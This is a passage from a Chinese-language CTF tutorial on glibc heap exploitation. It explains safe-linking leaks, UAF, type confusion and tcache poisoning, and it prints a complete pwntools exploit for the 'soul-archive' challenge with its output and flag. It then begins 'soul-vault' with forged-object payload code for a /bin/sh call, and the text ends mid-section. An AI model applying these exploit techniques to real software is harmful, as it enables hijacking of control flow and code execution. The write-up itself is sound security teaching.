（原始碼裡的巨集叫 \code{PROTECT\_PTR}；要解回來叫 \code{REVEAL\_PTR}。）

\begin{whybox}[這個設計的用意與「副作用」]
\textbf{用意}：位址被 \code{>> 12} 混過，所以 \code{fd} 本身\textbf{不是一個合法指標}。
傳統「直接把 \code{fd} 改成目標位址」的攻擊因此失效——你必須先知道「這塊 chunk 在哪」。

\textbf{副作用（也就是我們的機會）}：因為 \code{>> 12}，\textbf{高位 28 bits 是保留的}。
所以從一個 \code{fd} 就能反推\textbf{頁碼}，也就是 heap 的位址範圍。這正是 leak 的來源。
\end{whybox}

實測（同一組資料，接著上面的 house-of-water）：

\begin{lstlisting}[style=raw]
fd_a = 0x000000055a83281c        # A 是 bin 裡的第一塊 -> next = NULL
fd_b = 0x000055ad6802ed0c        # B 的 fd = A ^ (B >> 12)
\end{lstlisting}

\begin{keybox}[怎麼從這兩個數字算出所有位址]
\begin{enumerate}[leftmargin=1.4em,itemsep=1pt]
  \item \code{fd\_a} 是 \code{NULL ^ (A >> 12)}，所以 \textbf{\code{A >> 12} = \code{fd\_a}}。
  \item 於是 \code{heap = fd\_a << 12}（得到 \code{0x55a83281c000}）。
  \item \code{fd\_b = A ^ (B >> 12)}。因為 A 與 B 在同一頁（\code{B >> 12 == A >> 12}），
        所以 \code{A = fd\_b ^ fd\_a}（得到 \code{0x55a83281c510}）。
\end{enumerate}

驗證：\code{A - heap = 0x510}，也就是「A 是 heap 的第 \code{0x510} 個 byte」。
\textbf{所有位址都有了，而且完全不需要 \code{\%p}。}
\end{keybox}

\begin{warnbox}[讀 leak 的時候要小心 \code{0x00}]
\code{fd} 的 bit 47 以上是 0，所以字串輸出會被 \code{0x00} 截斷。
你只會拿到 \textbf{5 或 6 bytes}。用 \code{u64(raw.ljust(8, b'\textbackslash x00'))} 補齊就對了。
（後面的腳本都有一行 \code{len(raw) != 5} 的檢查，就是這個原因。）
\end{warnbox}

\subsection{\code{tcache\_perthread\_struct}：heap 的第一塊}

\begin{keybox}[記住這個常數：\code{0x290}]
程式\textbf{第一次呼叫 \code{malloc}} 時，glibc 會偷偷先配一塊
\code{tcache\_perthread\_struct}（大小 \code{0x290}，裡面是那 64 個 bin 的鏈頭與計數器）。
它就落在 heap 的開頭。

\begin{lstlisting}[style=raw]
heap + 0x000   chunk header (prev_size, size)
heap + 0x010   tcache_perthread_struct 的內容 ... 一直用到
heap + 0x290   <-- 這一塊結束，下一個 chunk 的標頭在這裡
heap + 0x2a0   <-- 下一個 chunk 的 user data = 程式「第一次 malloc」拿到的位址
\end{lstlisting}

所以：\textbf{程式第一個 \code{malloc} 的回傳值 = \code{heap + 0x2a0}}。
\end{keybox}

\begin{whybox}[house-of-water 為什麼要靠這個常數]
那題把 flag 讀進了\textbf{第一個 heap 配置}，也就是 \code{heap+0x2a0}。
我們的目標就是「讓 \code{malloc} 回傳 \code{heap+0x2a0}」，然後 \code{show} 它。
知道 \code{0x290} 這個常數，才知道要毒到哪裡去。第 \ref{chap:house} 章會完整走一遍。
\end{whybox}

\subsection{三種 heap 攻擊的名字}

\begin{longtable}{@{}p{3.6cm}p{11.4cm}@{}}
\toprule
\textbf{名稱} & \textbf{定義與在五題裡的位置}\\
\midrule
\endhead
\textbf{UAF}（use-after-free） &
  \code{free(ptr)} 之後 \code{ptr} 沒有被清成 \code{NULL}，
  於是程式還留著一個指向已釋放記憶體的\textbf{懸空指標}。
  你透過它讀 $\Rightarrow$ leak；透過它寫 $\Rightarrow$ 改 \code{fd}。
  \textbf{三題的根（soul-archive、soul-vault、house-of-water）。}\\
\textbf{Type confusion}（型別混淆） &
  兩個\textbf{大小相同的結構}共用同一塊記憶體，但欄位意義不同。
  你以為在寫「A 的欄位」，其實蓋到「B 的函式指標」。
  \textbf{soul-archive 與 soul-vault 都用這招。}\\
\textbf{Tcache poisoning} &
  改掉 free chunk 的 \code{fd}，讓下一次 \code{malloc} 回傳你指定的位址。
  \textbf{house-of-water 的主菜。}\\
\bottomrule
\end{longtable}

\subsection{兩道 glibc 的「防呆」你一定要知道}

\subsubsection{double free 偵測（glibc 2.34+）}

\code{free} 一個 chunk 時，glibc 會把它放進 tcache 並在 \code{user+8} 寫入 \code{key}。
如果\textbf{同一個 chunk} 連續被 free 兩次，第二次會發現 bin 裡已經有一塊 key 相同的，
於是報錯：

\begin{lstlisting}[style=raw]
free(): double free detected in tcache 2
\end{lstlisting}

\begin{keybox}[所以「free 兩次」其實是可以的，只要不是同一塊]
\begin{lstlisting}[style=raw]
free(A); free(A);            -> 爆炸（double free）
free(A); free(B); free(A);   -> 沒事，tcache[..] = A -> B -> A
\end{lstlisting}
第二種情況下 A 確實出現兩次（這是可以拿去利用的），但 glibc 只檢查「連續」。
這也是為什麼 soul-vault 要「release(1)、release(0)」這樣交錯地釋放。
\end{keybox}

\subsubsection{16-byte 對齊檢查}

\code{malloc} 從 tcache 取塊時會檢查「這塊的位址是不是 16 的倍數」。
你在做 tcache poisoning 時，如果目標位址沒對齊，就會看到：

\begin{lstlisting}[style=raw]
malloc(): unaligned tcache chunk detected
\end{lstlisting}

\begin{warnbox}[所以毒 \code{fd} 時目標要對齊]
這也是為什麼 house-of-water 挑的目標是 \code{heap + 0x290}（標頭）而不是 \code{heap + 0x295} 之類的：
\code{0x290} 是 16 的倍數，取出來的 user 位址 \code{0x2a0} 也是。
\end{warnbox}

\subsection{本課小結：把 heap 攻擊想成「改一張紙條」}

\begin{keybox}[一句話]
\code{malloc} 的邏輯是「\textbf{去看 bin 的頭，把那塊給你，並把頭換成它 \code{fd} 寫的下一塊}」。
所以只要你能改 \code{fd}，你就能決定\textbf{下一次 malloc 給你哪一塊}。

三個名詞其實是同一件事的三個步驟：
\textbf{UAF 讓你寫得進去} $\Rightarrow$ \textbf{type confusion 讓寫入落在有用的欄位上}
$\Rightarrow$ \textbf{poisoning 讓 malloc 吐給你想要的位址}。
\end{keybox}

\section{第三題：soul-archive-thanos}
\label{chap:archive}

從這一題開始是真正的 heap 題，也很適合當你打的第一題 heap。
因為它把三個重要觀念各用了一次：\textbf{UAF}、
\textbf{type confusion}、\textbf{tcache}。
而且 \textbf{PIE 的 leak 是題目自己送你的}（有 \code{\%p}）。

\subsection{防禦機制與整體形狀}

\begin{lstlisting}[style=raw]
RELRO:      Full RELRO
Stack:      Canary found
NX:         NX enabled
PIE:        PIE enabled
\end{lstlisting}

\begin{itemize}[leftmargin=1.4em,itemsep=1pt]
  \item \textbf{Canary + PIE} $\Rightarrow$ 放棄 stack overflow。
  \item 有 \code{malloc}/\code{free}/\code{edit}/\code{show} 選單 $\Rightarrow$ heap 題。
  \item \textbf{Full RELRO} $\Rightarrow$ 不能改 GOT。但我們不需要。
\end{itemize}

選單（從 \code{strings} 拿）：

\begin{lstlisting}[style=raw]
1. Capture soul      2. Inspect soul     3. Merge souls
4. Erase soul        5. Transfer soul (Record Log)      6. Exit
\end{lstlisting}

\begin{keybox}[先找「哪個 free 沒有把指標清掉」]
這是所有 heap 題的第一步。三個地方會 \code{free}：

\begin{longtable}{@{}p{3.4cm}p{11.6cm}@{}}
\toprule
\textbf{函式} & \textbf{有沒有把 \code{archive[idx]} 設成 NULL}\\
\midrule
\endhead
\code{erase\_soul} & \textbf{有}（\code{mov QWORD PTR [rdx+rax*1],0x0}）$\Rightarrow$ 安全。\\
\code{merge\_souls} & \textbf{沒有}！它只做 \code{cached\_souls[cache\_count++] = s2; free(s2);}\\
                   & $\Rightarrow$ \textbf{這就是 UAF}：\code{archive[b]} 變成懸空指標。\\
\bottomrule
\end{longtable}
\end{keybox}

\subsection{資料結構：Soul}

\code{capture\_soul} 做的是 \code{malloc(0x40)}（$\Rightarrow$ chunk size \code{0x50}），
然後填這些欄位：

\begin{longtable}{@{}p{3.0cm}p{2.6cm}p{9.4cm}@{}}
\toprule
\textbf{欄位} & \textbf{偏移} & \textbf{說明}\\
\midrule
\endhead
\code{name}       & \code{+0x00} & 最多 \code{0x20} bytes（\code{read\_str(name, 0x20)}）。\\
\code{essence}    & \code{+0x20} & 8 bytes 數值。merge 時會相加。\\
\code{type}       & \code{+0x28} & 型別編號（1=Human 2=Avenger 3=Guardian 4=Titan 5=Void）。\\
（未使用）        & \code{+0x30} & \\
\code{inspect}    & \code{+0x38} & \textbf{函式指標}。依 \code{type} 決定指向哪個 \code{inspect\_*}。\\
\bottomrule
\end{longtable}

而 \code{inspect\_soul} 的結尾是這四行——\textbf{這題的命門}：

\begin{lstlisting}[style=asm]
  1c55:  mov    rax,[rbp-0x8]        ; rax = soul
  1c59:  mov    rax,[rax+0x38]       ; rax = soul->inspect
  1c5d:  test   rax,rax
  1c60:  je     1c73                 ; 是 NULL 就跳過
  1c62:  mov    rax,[rbp-0x8]
  1c66:  mov    rdx,[rax+0x38]       ; rdx = soul->inspect
  1c6a:  mov    rax,[rbp-0x8]
  1c6e:  mov    rdi,rax              ; rdi = soul  <-- 第一個參數就是 soul 自己
  1c71:  call   rdx                  ; <== 呼叫 soul->inspect(soul)
\end{lstlisting}

\begin{keybox}[一句話]
\textbf{只要我能寫到某個 Soul 的 \code{+0x38}，我就能控制 \code{rip}，
而且 \code{rdi} 會剛好是那個 Soul 的位址。}
\end{keybox}

\subsection{PIE leak：題目自己給的}

\code{inspect\_soul} 會把 \code{+0x38} 用 \code{\%p} 印出來：

\begin{lstlisting}[style=raw]
Inspect Callback: 0x55b2b03e33a9
\end{lstlisting}

而型別 1（Human）對應的 \code{inspect\_human} 在檔案裡的偏移是 \code{0x13a9}，
所以：

\[
\text{PIE base} = \text{leak} - 0x13a9
\]

\begin{lstlisting}[style=raw]
[+] inspect_human leak = 0x55b2b03e33a9  ->  PIE base = 0x55b2b03e2000
\end{lstlisting}

\begin{keybox}[驗算方式]
PIE base \textbf{一定是 page 對齊}（結尾 \code{000}）。算出來是 \code{0x55b2b03e2000}，
符合 $\Rightarrow$ offset 猜對了。\textbf{每次 leak 都要做這個檢查。}
\end{keybox}

\subsection{目標：\code{soul\_ascension()} 的四個條件}

程式裡有一個從沒被呼叫的 \code{soul\_ascension()}，它會印 flag。但它在開頭有四道檢查：

\begin{lstlisting}[style=asm]
  151a:  mov    eax,[total_captured]      ; 全域變數
  1520:  cmp    eax,0x5
  1523:  jle    FAIL                     ; 要 > 5
  1529:  mov    eax,[merges_performed]
  152f:  cmp    eax,0x3
  1532:  jne    FAIL                     ; 要 == 3
  1538:  mov    eax,[souls_erased]
  153e:  cmp    eax,0x1
  1541:  jne    FAIL                     ; 要 == 1
  155a:  movabs rdx,0x50574e534f554c53     ; "SLUOSNWP"（小端序）
  1564:  cmp    rax,rdx
  1567:  jne    FAIL                     ; soul->essence 要等於這個魔術數字
\end{lstlisting}

\begin{keybox}[把四個條件翻譯成「我該做什麼」]
\begin{longtable}{@{}p{4.6cm}p{10.4cm}@{}}
\toprule
\textbf{條件} & \textbf{動作}\\
\midrule
\endhead
\code{total\_captured > 5} & capture \textbf{6} 次（每 capture 一次就 +1）。\\
\code{merges == 3} & merge \textbf{3} 次（每次 merge 會 free 掉第二個，正好製造 3 個懸空指標）。\\
\code{erased == 1} & erase \textbf{1} 次。\\
\code{essence == 0x50574e534f554c53} & 把偽造的 Soul 的 \code{+0x20} 填成這個值。\\
\bottomrule
\end{longtable}
\end{keybox}

\subsection{type confusion：TransferRecord 蓋到 Soul}

第 5 個功能 \code{transfer\_soul} 是這題的「武器」。它做 \code{malloc(0x40)}，
然後把使用者輸入填進一個 \textbf{TransferRecord}：

\begin{lstlisting}[style=asm]
  1f15:  mov    edi,0x40
  1f1a:  call   malloc@plt            ; 0x40 -> chunk size 0x50（和 Soul 一樣！）
  ...
  1f5e:  call   read_str              ; Realm of origin -> +0x00 (0x18 bytes)
  1f82:  mov    [rax+0x18],edx        ; Transfer ID     -> int  +0x18
  1fa4:  mov    [rax+0x1c],edx        ; Entropy Flags   -> int  +0x1c
  1ff2:  mov    [rdx+0x20],rax        ; Timestamp       -> u64  +0x20
  2041:  mov    [rdx+0x28],rax        ; Raw Entropy     -> u64  +0x28
  2098:  mov    [rax+0x38],rdx        ; Audit Callback  -> u64  +0x38
  20a4:  mov    [rax+0x30],rdx        ; （同上，也寫一份到 +0x30）
\end{lstlisting}

把兩張表疊起來看，這就是\textbf{型別混淆}：

\begin{longtable}{@{}p{2.4cm}p{4.4cm}p{4.4cm}@{}}
\toprule
\textbf{偏移} & \textbf{Soul 的意義} & \textbf{TransferRecord 的意義}\\
\midrule
\endhead
\code{+0x00} & \code{name}    & Realm of origin\\
\code{+0x20} & \code{essence} & Timestamp $\Rightarrow$ \textbf{我們要填魔術數字的地方}\\
\code{+0x28} & \code{type}    & Raw Entropy\\
\code{+0x38} & \code{inspect} & Audit Callback $\Rightarrow$ \textbf{我們要填 \code{soul\_ascension} 的地方}\\
\bottomrule
\end{longtable}

\begin{whybox}[為什麼這樣就行得通？]
因為 \code{Soul} 和 \code{TransferRecord} 的\textbf{大小一樣}（都是 \code{malloc(0x40)}），
所以\textbf{它們會從同一個 tcache bin（\code{0x50}）拿記憶體}。
只要我讓某個還是「Soul」身分的懸空指標所指的記憶體，
被 \code{transfer\_soul} 重新配走並填上我的資料，
那個「Soul」的欄位就被我改掉了——\textbf{包含函式指標}。
\end{whybox}

\subsection{攻擊計畫}

\begin{longtable}{@{}p{1.0cm}p{5.0cm}p{9.0cm}@{}}
\toprule
\textbf{步} & \textbf{動作} & \textbf{效果}\\
\midrule
\endhead
1 & \code{capture} $\times 6$ & \code{archive[0..5]} 各拿到一塊 \code{0x50} chunk；\code{total\_captured=6}。\\
2 & \code{inspect(0)} & 拿到 \code{Inspect Callback} $\Rightarrow$ 算出 PIE base 與 \code{soul\_ascension} 位址。\\
3 & \code{merge(0,1)} & 相加 essence、\code{free(chunk1)}。\code{archive[1]} 變懸空。\\
4 & \code{merge(2,3)} & \code{free(chunk3)}。\\
5 & \code{merge(4,5)} & \code{free(chunk5)}。\code{merges=3}。\\
6 & \code{erase(0)} & \code{free(chunk0)} 並把 \code{archive[0]=NULL}。\code{erased=1}。\\
7 & \code{transfer(...)} & \code{malloc} 從 tcache 取出\textbf{最上面那塊} $\Rightarrow$ 拿到 \code{chunk0}（但沒人指它，浪費掉）。\\
8 & \code{transfer(...)} & 再取一次 $\Rightarrow$ 拿到 \textbf{\code{chunk5}}，也就是 \code{archive[5]} 指的地方。\textbf{在這裡填偽造的內容。}\\
9 & \code{inspect(5)} & 呼叫 \code{[chunk5+0x38](chunk5)} $=$ \code{soul\_ascension(soul)} $\Rightarrow$ 印 flag。\\
\bottomrule
\end{longtable}

\begin{keybox}[為什麼要 \code{transfer} 兩次？]
因為 tcache 是 LIFO。看第 6 步之後 bin 的內容：

\begin{lstlisting}[style=raw]
tcache[0x50] 的頭 -> chunk0 -> chunk5 -> chunk3 -> chunk1
                    ^^^^^^    ^^^^^^
                    archive[0] 已經被 erase 清成 NULL（沒人指它）
                               archive[5] 還懸空指著（我要的就是這塊）
\end{lstlisting}

第一個 \code{transfer} 把 \code{chunk0} 配走，但那塊已經「沒人指」了，等於浪費一次。
第二個 \code{transfer} 才配到 \code{chunk5}。
\textbf{這就是「算 tcache 順序」在實戰裡的樣子}——你必須精確知道第幾次 malloc 會拿到哪一塊。
\end{keybox}

\subsection{完整腳本}

\begin{lstlisting}[style=py]
#!/usr/bin/env python3
from pwn import *
import re

context.arch = 'amd64'
context.log_level = 'info'

ROOT = '/home/kzzz/Documents/code/ctf/ctf7/pwn'
BIN  = os.path.join(ROOT, 'solve/soul/soul_archive_patched')
elf  = ELF(BIN, checksec=False)

MAGIC           = 0x50574e534f554c53     # "SLUOSNWP"
INSPECT_HUMAN   = 0x13a9                 # 用來回推 PIE base
SOUL_ASCENSION  = 0x14fb                 # 真正的 win()

io = process(BIN)
io.recvuntil(b'> ')

def cmd(n): io.sendline(str(n).encode())

def capture(name, typ, essence):
    cmd(1)
    io.sendlineafter(b'Soul name: ', name)
    io.sendlineafter(b'Type: ', str(typ).encode())
    io.sendlineafter(b'Initial Essence (hex value e.g. 1000): ', essence)
    io.recvuntil(b'> ')

def inspect(i):
    cmd(2)
    io.sendlineafter(b'Enter vessel index (0-7): ', str(i).encode())
    return io.recvuntil(b'> ')

def merge(a, b):
    cmd(3)
    io.sendlineafter(b'First vessel index to merge: ', str(a).encode())
    io.sendlineafter(b'Second vessel index to merge: ', str(b).encode())
    io.recvuntil(b'> ')

def erase(i):
    cmd(4)
    io.sendlineafter(b'Enter vessel index to erase (0-7): ', str(i).encode())
    io.recvuntil(b'> ')

def transfer(realm, tid, flags, timestamp, entropy, callback):
    cmd(5)
    io.sendlineafter(b'Realm of origin: ', realm)
    io.sendlineafter(b'Transfer ID (decimal): ', str(tid).encode())
    io.sendlineafter(b'Entropy Flags (decimal): ', str(flags).encode())
    io.sendlineafter(b'Timestamp (hex e.g. 1337): ', timestamp)
    io.sendlineafter(b'Raw Entropy / Essence (hex): ', entropy)
    io.sendlineafter(b'Audit Callback Address (hex, 0 for default): ', callback)
    return io.recvuntil(b'> ')

# 1. 六個 soul
for i in range(6):
    capture(b'soul%d' % i, 1, b'1000')

# 2. leak PIE
out  = inspect(0)
leak = int(re.search(rb'Inspect Callback: (0x[0-9a-f]+)', out).group(1), 16)
pie  = leak - INSPECT_HUMAN
win  = pie + SOUL_ASCENSION
log.success('PIE base = %#x   soul_ascension = %#x', pie, win)

# 3~5. 三次 merge -> merges = 3，chunk1/3/5 變懸空
merge(0, 1); merge(2, 3); merge(4, 5)

# 6. 一次 erase -> erased = 1
erase(0)

# 7. 先配掉沒人指的 chunk0
transfer(b'junk', 1, 1, b'0', b'0', b'0')

# 8. 再配到 chunk5（archive[5] 懸空指著它），蓋成偽造的 Soul
#    Timestamp -> essence(+0x20) = MAGIC
#    Callback  -> inspect(+0x38) = soul_ascension
transfer(b'thanos', 2, 2, hex(MAGIC)[2:].encode(), b'0', hex(win)[2:].encode())

# 9. inspect(5) -> call [chunk5+0x38](chunk5)
out = inspect(5)
print(out.decode(errors='replace'))
\end{lstlisting}

\subsection{執行結果}

\begin{lstlisting}[style=raw]
[+] inspect_human leak = 0x55b2b03e33a9  ->  PIE base = 0x55b2b03e2000
[*] soul_ascension() = 0x55b2b03e34fb
[*] merges = 3, archive[1], archive[3], archive[5] now dangle
--- Vessel [5] ---
Soul Name: thanos
Type: 0x0
Essence: 0x50574e534f554c53          <-- 魔術數字進去了
Inspect Callback: 0x55b2b03e34fb     <-- soul_ascension

    THE SOUL STONE ASCENSION AWAKENS

[+] You have mastered the memory of the cosmos.
OWASP{Th4n0s_S0ul_Mem0ry_UAF_Type_Confusion}
\end{lstlisting}

\begin{keybox}[注意輸出的順序]
「\code{--- Vessel [5] ---}」那一段是 \code{inspect\_soul} \textbf{在呼叫之前}印的欄位表。
你看得到 \code{Essence} 與 \code{Inspect Callback} 都已經被我們換掉了，
\textbf{這就是最好的證據}：型別混淆成功了。
然後才輪到 \code{soul\_ascension} 把 flag 印出來。
\end{keybox}

\subsection{這一題要帶走的三件事}

\begin{enumerate}[leftmargin=1.5em,itemsep=3pt]
  \item \textbf{找 UAF 的方法}：把每個 \code{free} 都看一遍，問「指標有沒有被清成 NULL」。
        \code{erase\_soul} 有清、\code{merge\_souls} 沒清 $\Rightarrow$ 答案就在 merge。
  \item \textbf{type confusion 的條件是「大小一樣」}：
        兩個結構都是 \code{malloc(0x40)}，才會共用同一個 tcache bin，
        才會「一個被 free、另一個被配走」而重疊。
        \textbf{看到兩個同大小的 struct，就要開始想這件事。}
  \item \textbf{一定要會算 tcache 的 LIFO 順序}。
        這一題「為什麼要 transfer 兩次」就是純粹的順序問題。
        動手之前在紙上把 \code{head -> A -> B -> C} 畫出來，比在 gdb 裡瞎猜快十倍。
\end{enumerate}

\begin{warnbox}[下一題會更難]
這一題的 PIE leak 是題目佛心送的（有 \code{\%p}）。
下一題 soul-vault \textbf{完全沒有任何 \code{\%p}}，
你會看到怎麼\textbf{只靠 heap 上的資料}把一個程式碼位址挖出來。
\end{warnbox}

\section{第四題：soul-vault-collector}
\label{chap:vault}

這是五題裡我認為最漂亮的一題。它的難點不是漏洞本身，而是：

\begin{keybox}[題目刻意不給你任何位址洩漏]
整支程式\textbf{沒有任何 \code{\%p}}。你唯一能 leak 的是 heap 位址，
而第二章已經證明\textbf{heap 基底和 PIE 基底是獨立的}。
但你要呼叫的 \code{system@plt} 在 PIE 裡。

所以問題變成：\textbf{能不能只用 heap 上的資料，挖出一個程式碼位址？}
答案是可以，而且手法非常乾淨。
\end{keybox}

\subsection{防禦機制與選單}

\begin{lstlisting}[style=raw]
RELRO:      Full RELRO
Stack:      Canary found
NX:         NX enabled
PIE:        PIE enabled
\end{lstlisting}

\begin{lstlisting}[style=raw]
1. Capture Soul     2. Inspect Soul     3. Release Soul
4. Rename Soul      5. Enter Soul Stone  6. Exit
\end{lstlisting}

\begin{warnbox}[先確認選單編號和實際行為一致]
我實測過：\code{2} 真的是 Inspect（會印 \code{--- Vessel [n] ---}），
\code{3} 真的是 Release（會印 \code{[+] Soul released back to the ether.}）。
\textbf{和選單上寫的一致}。寫 exploit 之前先花三十秒確認這件事，
比事後懷疑人生便宜很多。
\end{warnbox}

\subsection{Soul 的長相}

\code{capture\_soul} 是 \code{malloc(0x38)}（$\Rightarrow$ chunk size \code{0x40}）：

\begin{longtable}{@{}p{3.0cm}p{2.6cm}p{9.4cm}@{}}
\toprule
\textbf{欄位} & \textbf{偏移} & \textbf{說明}\\
\midrule
\endhead
\code{name}     & \code{+0x00} & \code{read\_string(soul, 0x1f)}，最多 0x1f bytes。\\
\code{memory}   & \code{+0x20} & \textbf{指標}，指向 \code{malloc(mem\_size)} 的另一塊。\\
\code{callback} & \code{+0x28} & \textbf{函式指標}，預設是 \code{stone\_callbacks[stone\_state \% 6]}。\\
\code{id}       & \code{+0x30} & \code{int}，值為 \code{index + 0x1337}。\\
\code{mem\_size}& \code{+0x34} & \code{int}，記憶體大小（1 \verb|~| 0x400，否則預設 0x40）。\\
\bottomrule
\end{longtable}

\begin{keybox}[記住兩件事]
\begin{enumerate}[leftmargin=1.4em,itemsep=1pt]
  \item \code{memory} 那塊是\textbf{另外一次 \code{malloc}}，所以一次 capture 會配兩塊：
        \code{0x40}（結構）與 \code{mem\_size} 對應的大小（記憶體）。
  \item \code{+0x28} 是函式指標，而 \code{inspect\_soul} 會\textbf{直接呼叫它}。
\end{enumerate}
\end{keybox}

\subsection{三個 bug}

\subsubsection{bug 1：\code{release\_soul} 不把指標清掉 $\Rightarrow$ UAF}

\begin{lstlisting}[style=asm]
  1988:  mov    rax,[rbp-0x8]        ; rax = soul
  198c:  mov    rax,[rax+0x20]       ; soul->memory
  1990:  test   rax,rax
  1993:  je     19a5                 ; NULL 就跳過
  19a0:  call   free@plt             ; free(soul->memory)
  19a5:  mov    rax,[rbp-0x8]
  19ac:  call   free@plt             ; free(soul)
  19b1:  mov    eax,[sacrifice_count]
  ...                                ; sacrifice_count++  （然後就結束了）
\end{lstlisting}

\textbf{沒有任何一行把 \code{souls[idx]} 設成 NULL。}
所以 release 之後 \code{souls[idx]} 還是懸空指標，而且\textbf{兩塊 chunk 都被 free 了}
（結構與 memory）——UAF 的範圍比 soul-archive 那題更大。

\subsubsection{bug 2：\code{capture\_soul} 把輸入寫進 \code{soul->memory} 指的地方}

\begin{lstlisting}[style=asm]
  16d7:  call   malloc@plt            ; malloc(mem_size) -> soul->memory
  16e3:  mov    [rax+0x20],rdx
  ...
  1732:  mov    eax,[rbp-0xc]
  1735:  sub    eax,0x1               ; size - 1
  173e:  mov    rax,[rax+0x20]        ; rax = soul->memory
  1747:  call   read_string           ; <== 把我們輸入的字串寫到 *soul->memory*
\end{lstlisting}

這句話要讀三次：\textbf{「寫入的目的地是一個 \code{malloc} 回來的指標」。}
如果我能讓那次 \code{malloc} 回傳\textbf{別的物件}的位址，
我就能把那個物件的欄位\textbf{任意改寫}。

\subsubsection{bug 3：\code{inspect\_soul} 是任意讀 + 任意呼叫}

\begin{lstlisting}[style=asm]
  18bd:  mov    rax,[rax+0x20]       ; soul->memory
  18c1:  test   rax,rax
  18c4:  je     ...                  ; NULL 就跳過
  18e0:  call   printf@plt           ; printf("Memory: %s", soul->memory)
  18e9:  mov    rax,[rax+0x28]       ; soul->callback
  18ed:  test   rax,rax
  18f0:  je     ...                  ; NULL 就跳過
  1901:  call   rdx                  ; <== 呼叫 soul->callback(soul)
\end{lstlisting}

\begin{keybox}[把三個 bug 串起來]
\begin{itemize}[leftmargin=1.4em,itemsep=1pt]
  \item \textbf{任意讀}：\code{printf("\%s", soul->memory)}——只要我能改 \code{memory}，
        就能讀\textbf{任意位址}的字串。
  \item \textbf{任意呼叫}：\code{callback(soul)}，且 \code{rdi = soul}。
  \item \textbf{任意寫}：capture 時把資料寫到 \code{soul->memory} 指的地方。
\end{itemize}
三個都是「指標由我決定」。剩下的問題只有一個：\textbf{怎麼決定？}
\end{keybox}

\subsection{第一步：從 heap 上 leak 出 heap 基底}

UAF 給你一個讀 dangling 結構的能力。\code{release(1)} 之後，
\code{souls[1]} 那塊 chunk 的\textbf{前 8 bytes（也就是 \code{name}）}已經被 tcache 的 \code{fd} 佔用：

\begin{lstlisting}[style=raw]
--- Vessel [1] ---
Name: \x1c(\x83Z\x05            <-- 這是 fd，不是名字了
\end{lstlisting}

因為 safe-linking（見 \ref{sec:safelink}），\code{fd = NULL \^{} (chunk >> 12)}，
所以 \code{fd} 本身就是 \textbf{chunk 位址 $\gg$ 12}。於是：

\begin{lstlisting}[style=py]
raw  = re.search(rb'Name: ([^\n]*)\n', out).group(1)   # 只會拿到 5 bytes
l    = u64(raw.ljust(8, b'\x00'))
heap = l << 12
\end{lstlisting}

\begin{lstlisting}[style=raw]
[+] heap = 0x5616bbddd000   souls[0] = 0x5616bbddd2a0   souls[1] = 0x5616bbddd310
\end{lstlisting}

\begin{keybox}[\code{0x2a0} 與 \code{0x310} 是怎麼來的]
一次 capture 配兩塊：結構 \code{0x40}、記憶體 \code{0x30}（\code{mem\_size=0x20}），共 \code{0x70}。

\begin{lstlisting}[style=raw]
heap + 0x290   第一塊 chunk 的標頭（前面 0x290 是 tcache_perthread_struct）
heap + 0x2a0   souls[0] 的結構      (chunk 0x40)
heap + 0x2d0   souls[0]->memory     的標頭 (chunk 0x30)
heap + 0x300   souls[1] 結構的標頭
heap + 0x310   souls[1]                <-- 0x2a0 + 0x70
heap + 0x340   souls[1]->memory 的標頭
\end{lstlisting}

\textbf{這張圖要背下來}，整題都靠它。這兩個數字建議用 gdb 對一次
（\code{p \&souls}、\code{x/8gx \&souls}），確認你的 libc 版本下不會有差異。
\end{keybox}

\subsection{第二步：讓 \code{malloc} 把記憶體配到「別的 Soul」身上}

現在關鍵動作。tcache 是 LIFO，所以\textbf{我們能預測第幾次 \code{malloc} 會拿到哪一塊}。

\begin{longtable}{@{}p{1.2cm}p{5.4cm}p{8.4cm}@{}}
\toprule
\textbf{步} & \textbf{動作} & \textbf{tcache[0x40] 的狀態（左邊是頭）}\\
\midrule
\endhead
a & \code{release(1)} & \code{[S1]}（\code{S1} = \code{0x300} 那塊）\\
b & \code{release(0)} & \code{[S0, S1]}\\
c & \code{capture(size=0x38)} 的\textbf{結構} malloc & 彈出 \code{S0} $\Rightarrow$ 這是新 soul 的結構\\
d & \code{capture(size=0x38)} 的\textbf{記憶體} malloc & 彈出 \textbf{\code{S1}} $\Rightarrow$ \code{soul->memory = 0x310}\\
\bottomrule
\end{longtable}

\begin{keybox}[看到了嗎？]
第 d 步之後，\code{soul->memory} 剛好等於 \textbf{\code{souls[1]} 的位址}——
那個還懸空指著的舊 Soul。而第 e 步 \code{read\_string(soul->memory, size-1)}
就會把我們輸入的內容\textbf{寫進 \code{souls[1]} 的每一個欄位}。

\textbf{這就是偽造物件的手法}：不是「找到一個可以寫的地方」，
而是\textbf{讓一個本來要寫進 buffer 的寫入，落到另一個物件的欄位上}。
\end{keybox}

\subsection{第三步：forge \#1 —— 用「讀字串」偷出 PIE}

先把 \code{souls[1]} 改造成「一台讀取機」：

\begin{lstlisting}[style=py]
forge1  = b'/bin/sh\x00' + b'\x00' * (0x20 - 8)   # name   (+0x00) = "/bin/sh"
forge1 += p64(s0 + 0x28)                          # memory (+0x20) -> soul2->callback
forge1 += p64(0)                                  # callback(+0x28) = 0（先不要呼叫）
forge1 += p32(0) + p32(0)                         # id, mem_size
assert len(forge1) == 0x38
capture_raw(0x38, b'C', forge1[:-1])              # 0x37 bytes + read_string 自動補的 NUL
\end{lstlisting}

\begin{whybox}[\code{memory = s0 + 0x28} 是什麼意思？]
\code{s0} 是 \code{souls[0]}（也就是剛剛被新 soul 回收的那塊，\code{heap+0x2a0}）。
\code{s0 + 0x28} 就是那個結構的 \code{callback} 欄位。

而那個 \code{callback} 裡裝的是\textbf{一個程式碼位址}——
\code{capture\_soul} 會把 \code{stone\_callbacks[stone\_state \% 6]} 寫進去，
而 \code{stone\_callbacks[0]} 就是 \code{callback\_soul}：

\begin{lstlisting}[style=raw]
$ nm soul_vault_patched | grep -E 'stone_callbacks|callback_soul'
0000000000004020 D stone_callbacks
0000000000001289 T callback_soul
\end{lstlisting}

所以 \code{souls[0]+\^{}0x28} 這個位置存著 \code{PIE + 0x1289}。
我把 \code{souls[1]->memory} 指向它，再用 \code{inspect(1)} 的
\code{printf("Memory: \%s")} 把它\textbf{當字串印出來}——

\begin{lstlisting}[style=raw]
Memory: \x89\x12\xc1\x5b\x16\x00      <-- 6 bytes，因為第 7 個 byte 是 0x00
\end{lstlisting}

$\Rightarrow$ \code{pie = leak - 0x1289}，而且驗算 \code{pie \& 0xfff == 0} 一定成立。
\end{whybox}

\begin{keybox}[這一段是整題的精華]
